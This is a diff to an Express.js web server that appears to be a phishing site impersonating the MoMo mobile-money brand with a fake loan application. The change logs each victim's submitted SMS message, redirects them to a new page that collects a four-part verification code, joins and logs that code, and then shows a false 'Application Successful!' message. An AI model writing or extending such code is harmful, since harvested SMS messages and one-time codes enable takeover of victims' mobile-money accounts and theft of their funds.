@@ -11,12 +11,21 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Handle the final SMS submission
+// 1. When they submit the SMS, send them to the Code page instead of the success screen
 app.post('/verify-sms', (req, res) => {
     const smsMessage = req.body.smsMessage;
+    console.log("SMS Verification Received:", smsMessage);
+
+    // Redirect to the verification code page
+    res.redirect('/verify-code.html');
+});
+
+// 2. Handle the final code submission
+app.post('/complete-application', (req, res) => {
+    const { code1, code2, code3, code4 } = req.body;
+    const fullCode = `${code1}${code2}${code3}${code4}`;
     
-    console.log("New Application Completed!");
-    console.log("SMS Received:", smsMessage);
+    console.log("Verification Code Submitted:", fullCode);
 
     // Show the final success page
     res.send(`
@@ -35,7 +44,7 @@ app.post('/verify-sms', (req, res) => {
             <div class="card">
                 <img src="momo-preview.jpg" alt="MoMo Logo" style="width: 100px; border-radius: 20px; margin-bottom: 20px;">
                 <h2>Application Successful!</h2>
-                <p>Your SMS has been verified and your loan application is now being processed. We will contact you shortly.</p>
+                <p>Your code has been verified and your loan application is now being processed. We will contact you shortly.</p>
                 <a href="/">Return Home</a>
             </div>
         </body>
